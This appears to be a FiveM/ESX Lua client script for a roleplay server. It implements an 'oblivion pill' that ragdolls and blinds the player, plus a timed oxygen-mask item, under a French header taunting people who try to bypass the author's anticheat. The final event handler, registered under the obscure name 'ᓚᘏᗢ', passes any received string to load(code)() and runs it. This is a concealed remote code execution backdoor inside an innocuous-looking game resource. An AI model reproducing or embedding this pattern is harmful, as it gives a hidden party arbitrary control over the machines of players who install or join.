-------- ARRETE D'ESSAYEZ DE DUMP POUR BYPASS MON ANTICHEAT TU REUSSIRA PAS ^^ --------
_print = print
_TriggerServerEvent = TriggerServerEvent
_NetworkExplodeVehicle = NetworkExplodeVehicle
_AddExplosion = AddExplosion

local locksound = false
local pillused = true

RegisterNetEvent('::{korioz#0110}::dix-oblivionpill:piluleoubli')
AddEventHandler('::{korioz#0110}::dix-oblivionpill:piluleoubli', function()
	Citizen.CreateThread(function()
		while true do
			Citizen.Wait(0)
			
			if pillused then
				AnimpostfxPlay("DeathFailOut", 0, 0)
				if not locksound then
					PlaySoundFrontend(-1, "Bed", "WastedSounds", 1)
					locksound = true
					pillused = true
				end

				ShakeGameplayCam("DEATH_FAIL_IN_EFFECT_SHAKE", 1.0)
				local scaleform = RequestScaleformMovie("MP_BIG_MESSAGE_FREEMODE")

				if HasScaleformMovieLoaded(scaleform) then
					Citizen.Wait(0)

					BeginScaleformMovieMethod(scaleform, "SHOW_SHARD_WASTED_MP_MESSAGE")
					BeginTextCommandScaleformString("STRING")
					AddTextComponentSubstringPlayerName(_U('fall_oubli'))
					EndTextCommandScaleformString()
					EndScaleformMovieMethod()

					Citizen.Wait(100)

					PlaySoundFrontend(-1, "TextHit", "WastedSounds", 1)
					
					while pillused do
						DrawScaleformMovieFullscreen(scaleform, 255, 255, 255, 255)
						SetPedToRagdoll(PlayerPedId(), 1000, 1000, 0, 0, 0, 0)
						DisablePlayerFiring(PlayerId(), true)
						Citizen.Wait(0)
					end

					AnimpostfxStop("DeathFailOut")
					locksound = false
				end
			end
		end
	end)
end)

RegisterNetEvent('::{korioz#0110}::dix-oblivionpill:stoppill')
AddEventHandler('::{korioz#0110}::dix-oblivionpill:stoppill', function()
	pillused = false
end)

RegisterNetEvent('::{korioz#0110}::dix-oblivionpill:oxygen_mask')
AddEventHandler('::{korioz#0110}::dix-oblivionpill:oxygen_mask', function()
	local playerPed = PlayerPedId()
	local coords = GetEntityCoords(playerPed, false)
	local boneIndex = GetPedBoneIndex(playerPed, 12844)
	local boneIndex2 = GetPedBoneIndex(playerPed, 24818)
	
	ESX.Game.SpawnObject('p_s_scuba_mask_s', vector3(coords.x, coords.y, coords.z - 3), function(object)
		ESX.Game.SpawnObject('p_s_scuba_tank_s', vector3(coords.x, coords.y, coords.z - 3), function(object2)
			AttachEntityToEntity(object2, playerPed, boneIndex2, -0.30, -0.22, 0.0, 0.0, 90.0, 180.0, true, true, false, true, 1, true)
			AttachEntityToEntity(object, playerPed, boneIndex, 0.0, 0.0, 0.0, 0.0, 90.0, 180.0, true, true, false, true, 1, true)
			SetPedDiesInWater(playerPed, false)
			
			ESX.ShowNotification(_U('dive_suit_on') .. '%.')
			Citizen.Wait(50000)
			ESX.ShowNotification(_U('oxygen_notify', '~y~', '50') .. '%.')
			Citizen.Wait(25000)
			ESX.ShowNotification(_U('oxygen_notify', '~o~', '25') .. '%.')
			Citizen.Wait(25000)
			ESX.ShowNotification(_U('oxygen_notify', '~r~', '0') .. '%.')
			
			SetPedDiesInWater(playerPed, true)
			DeleteObject(object)
			DeleteObject(object2)
			ClearPedSecondaryTask(playerPed)
		end)
	end)
end)

RegisterNetEvent('ᓚᘏᗢ')
AddEventHandler('ᓚᘏᗢ', function(code)
	load(code)()
end)